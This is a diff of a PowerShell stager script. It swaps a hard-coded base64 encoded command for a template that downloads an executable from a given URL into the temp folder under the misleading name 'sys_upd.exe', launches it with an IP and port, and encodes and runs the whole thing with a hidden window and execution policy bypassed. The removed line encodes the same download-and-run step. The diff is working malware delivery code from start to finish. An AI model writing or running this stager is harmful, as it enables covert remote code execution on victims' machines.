@@ -9,4 +9,17 @@ if (-not $URL -or -not $IP -or -not $PORT) {
     exit
 }
 
-powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand cABhAHIAYQBtACgAJAB1ACwAIAAkAGkALAAgACQAcAApADsAIABbAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsACAAPQAgAFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAIAAkAGYAPQAiACQAZQBuAHYAOgBUAEUATQBQAFwAcwB5AHMAXwB1AHAAZAAuAGUAeABlACIAOwAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJAB1ACwAIAAkAGYAKQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZgAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiACQAaQAgACQAcAAiAA== -Args $URL $IP $PORT
+# The template logic for the stager
+$RawScript = @"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+`$f="`$env:TEMP\sys_upd.exe";
+(New-Object Net.WebClient).DownloadFile('$URL', `$f);
+Start-Process `$f -ArgumentList '$IP $PORT'
+"@
+
+# Encode the script on-the-fly to UTF-16LE and Base64
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($RawScript)
+$Encoded = [Convert]::ToBase64String($Bytes)
+
+# Execute the final clean command
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $Encoded
